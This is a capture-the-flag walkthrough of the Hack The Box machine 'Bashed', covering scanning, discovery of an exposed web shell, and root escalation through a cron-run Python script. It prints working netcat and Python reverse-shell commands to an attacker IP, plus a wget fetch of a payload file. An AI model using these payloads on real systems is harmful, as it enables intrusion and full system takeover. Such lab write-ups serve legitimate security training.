Bashed-Easy

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/2/1.jpg)

Tools - Gobuster , (netcat)reverese shell , python(reverse shell)
        pyhton server.
        
Reconnaissance

• First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

nmap -sC -sV -O -oA nmap/initial 10.10.10.68

• -sC: run default nmap scripts

• -sV: detect service version

• -O: detect OS

• -oA: output all formats and store in file nmap/initial

 We get back the following result showing that port 80 is open with Apache HTTP Server running on it.
 
![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/2/2.jpg)
 
• Before we start investigating port 80, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.
 
• Let’s run an nmap scan that covers all ports.

nmap -sC -sV -O -p1–65535 -oA nmap/full 10.10.10.68

• We get back the following result. Now we’re sure that port 80 is the only port that is open.

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/2/3.jpg)

• Similarly, we run an nmap scan with the -sU flag enabled to run a UDP scan.

nmap -sU -O -oA nmap/udp 10.10.10.68

-sU = UDP Scan

We get back the following result. As can be seen, the top 1000 ports are closed.

• Our only avenue of attack is port 80, so let’s check it out.

Enumeration

• Head over to http://10.10.10.68 (defaults to port 80).

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/2/5.jpg)

• The arrow on the first page leads us to http://10.10.10.68/single.html.
 
• There, you can find a link to a GitHub repository explaining that this is a script used to create a semi-interactive web shell.
 
• Interesting! If we find the phpbash.php file, we can potentially get a web shell!
 
![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/2/6.jpg)
 
• Let’s do more enumeration on the web server. Run gobuster to enumerate directories.

gobuster dir -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.68

• -t: number of threads

• -w: wordlist

• -u: specify the URL

• dir: uses directory/file brute forcing mode

• The directories /images, /uploads, /php and /css lead us nowhere. So let’s move  on to the /dev directory.

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/2/7.jpg)

• We found the phpbash.php script and clicking on it gives us a web shell!



Gaining foothold

• What exactly does this shell do and in what context does it run?

whoamiiduname -a



• whoami: print effective userid

• id: print real and effective user and group IDs

• uname -a: print system information

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/2/8.jpg)

• We’re running in the context of an Apache default user www-data.
 
• For this machine, we already have a low privileged shell that allows us to run linux commands on the web server, so we don’t necessarily need to get our own reverse shell.
 
• However, in a real penetration test,you would place your own shell in the system just in case the creator notices his insecure configuration and takes down the php script.
 
• This way you’ll have consistent access to the system by a shell that you control.
 Since we’re modelling a real penetration test,let’s get a reverse shell going.
 
• In the attack machine (kali) set up a listener

nc -nlvp 4444

•In the target machine (bashed) send a reverse shell to the attack machine.

nc -nv 10.10.14.30 4444 -e /bin/sh


• Unfortunately, the connection keeps terminating. Let’s try sending a reverse shell in a different way.
  
• Pentestmonkey has a comprehensive list of reverse shells. Check if python exists on the target machine.

which python


• Since we get back a result,python is installed on the machine!

• Copy the python command from the list and change it to your attack machine’s ip address and listening port.

python -c 
' import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.30",4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'


• Yes! We have a reverse shell going.

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/2/9.jpg)

• Let’s find the user flag. Change to the home directory and view its contents.

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/2/10.jpg)

• I have execute privileges on both arrexel and scriptmanager directories. Let’s look in the arrexel directory first.

• We found the user flag!

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/2/11.jpg)



Privilege Escalation

• Next, I need to figure out what other privileges I have or can easily get.
  The following command lists the allowed commands for my user.
  
![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/2/12.jpg)
  
![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/2/13.jpg)
  
• The last two lines are particularly interesting because they say that the user 
  
• I’m  running in the context of (www-data) can run as the user scriptmanager     without having to provide the user’s password.

• This might come in handy later on.For the time being, let’s do some more enumeration.

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/2/14.jpg)

• Everything in the root directory seems to be owned by root except for the scripts directory which is owned by scriptmanager.
 
• In the previous step we found out that we can run as scriptmanager without a password.

sudo -i -u scriptmanager


-i = The -i (simulate initial login) option runs the shell specified by the
     password  database entry of the target user as a login shell.
-u = specify user 

• The above command changes the user to scriptmanager.

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/2/15.jpg)

• Now that we’re running in the context of scriptmanager, we have read/write/execute privileges in the scripts directory.

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/2/16.jpg)

• We have two files; one owned by us (test.py) and the other owned by root (test.txt).

• Let’s print out the content of test.py.

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/2/17.jpg)

• Interesting! It’s a simple python program that writes to the file test.txt.

• However, we saw in the previous image that test.txt is running as root! 
 
• Running the python program also seems to be something that is scheduled since the last access time of the test.txt file is very recent.
 
• In fact, the script seems to be executing every minute! It’s probably a cron job that is owned by root.
 
• Why is that great news for us? If I change the contents in the test.py file to send a reverse shell, that reverse shell will run as root!

• Changing the file on the shell was unbelievably difficult and glitchy. Therefore, I decided to transfer the file from my attack (kali) machine.

• In the kali machine, create a test.py file and add the reverse shell code to it.

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((“10.10.14.30”,5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);

• Change the file permission to rwx for everyone.

chmod 777 test.py

• In the same directory, start a simple HTTP server.

python -m SimpleHTTPServer 9005


• In the target (bashed) machine under the scripts directory, download the file.

• wget http://10.10.14.30:9005/test.py

• Now, go back to your attack (kali) vm and start up a listener with the same port specified in the test.py script.

nc -lnvp 5555


• Wait for a minute or so for the cron job to execute and voila! We have a shell running as root!

![dockerengine]({{ site.baseurl }}/post_img/writeups/htb/linux/2/18.jpg)


• Change to the root directory and get the root flag.

Lessons Learned
• The developer should not have had a web shell that publicly gives access to his system.

• This one is a no brainer and is probably something you won’t see in real life.

• Misconfiguring permissions can lead to disastrous consequences.

• Why was the web daemon user (www-data) allowed to become a more privileged user (scriptmanager)? Similarly, why was a non-root user created script (test.py) executed as root? These are known as security misconfigurations. 

• The developer should have conformed to the principle of least privilege and the concept of separation of privileges.

• What allowed us to get an initial foothold, is the fact that we found the /dev directory that contained the web shell.

• I imagine the developer thought no one would find this directory since it is not directly linked on the website. However, gobuster found it in mere minutes.

• The developer should not have sensitive publicly accessible directories available on his server.
